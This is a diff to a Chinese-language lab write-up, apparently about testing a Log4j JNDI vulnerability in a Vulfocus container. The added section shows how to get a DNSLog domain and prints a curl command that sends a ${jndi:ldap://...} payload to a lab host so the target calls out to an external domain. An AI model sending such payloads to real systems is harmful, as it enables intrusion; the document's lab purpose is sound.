@@ -309,7 +309,19 @@ sudo docker cp adoring_bhabha:/demo/demo.jar ./
 
 #### 验证漏洞可利用性
 
+在 [DNSLog](https://link.zhihu.com/?target=http%3A//www.dnslog.cn/) 平台中获得随即域名，构造 `POST` 请求的 `payload`
 
+![yuming](img/yuming.png)
+
+这里得到的域名为 `suhj0q.dnslog.cn`
+
+构造 `payload` 为 ``
+
+```bash
+curl -X POST http://192.168.254.128:50175/hello -d 'payload="${jndi:ldap://suhj0q.dnslog.cn/ohhhh}"'
+```
+
+自此，因为刷新了一下 `vulfocus` 页面，开始了无尽的 请联系管理员 报错
 
 #### 漏洞利用效果
 
